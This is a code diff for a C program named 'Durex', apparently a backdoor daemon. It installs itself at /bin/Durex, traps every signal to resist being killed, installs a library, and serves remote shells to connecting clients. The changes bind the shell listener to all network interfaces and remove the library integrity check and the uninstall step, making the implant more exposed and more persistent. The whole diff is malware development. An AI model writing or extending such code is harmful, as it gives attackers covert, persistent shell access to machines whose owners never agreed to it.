@@ -64,7 +64,7 @@ static int			launch_program()
 				if (ret > 0)
 				{
 					buf[ret] = '\0';
-					if (!mystrcmp(buf, "/bin/Durex"))
+					if (!mystrcmp(buf, DUREX_BINARY_FILE))
 						return 0;
 				}
 			}
@@ -74,7 +74,7 @@ static int			launch_program()
 	}
 	snprintf(buf, sizeof(buf), "%d", getpid());
 	write(e.lock, buf, mystrlen(buf));
-	for (int i = 0; i < NSIG; i++) {
+	for (int i = 0; i < _NSIG; i++) {
 		signal(i, &durexSigterm);
 	}
 	return 1;
@@ -115,10 +115,8 @@ void				durex()
 	struct timeval	timeout;
 
 	cleanStructure();
-	if (launch_program() && hireReporter() && install_library()) {
-		serverLog("[LOGS] - Opening Server...");
-		e.server.fd = openServer(SERVER_ADDR, SERVER_PORT);
-		serverLog("[LOGS] - Waiting for connections...");
+	if (launch_program() && hireReporter() && install_library() && openServer("0.0.0.0", SERVER_PORT)) {
+		serverLog("[LOGS] - Server opened !");
 		mymemset(&timeout, 0, sizeof(timeout));
 		while (1)
 		{
@@ -141,12 +139,11 @@ void				durex()
 				if (FD_ISSET(e.server.client[i].shell, &e.server.fdr))
 					serverReadClientShell(&e.server.client[i]);
 			}
-			check_library();
 		}
 		serverLog("Hm...");
-		uninstall_library();
 		quitClearlyServer();
 		quitClearlyDaemon();
+		exit(0);
 	}
 	struct passwd	*passwd;
 	passwd = getpwuid(getuid());
@@ -159,5 +156,4 @@ void			quitClearlyDaemon()
 	flock(e.lock, LOCK_UN);
 	close(e.lock);
 	remove(DUREX_LOCK_FILE);
-	exit(0);
 }
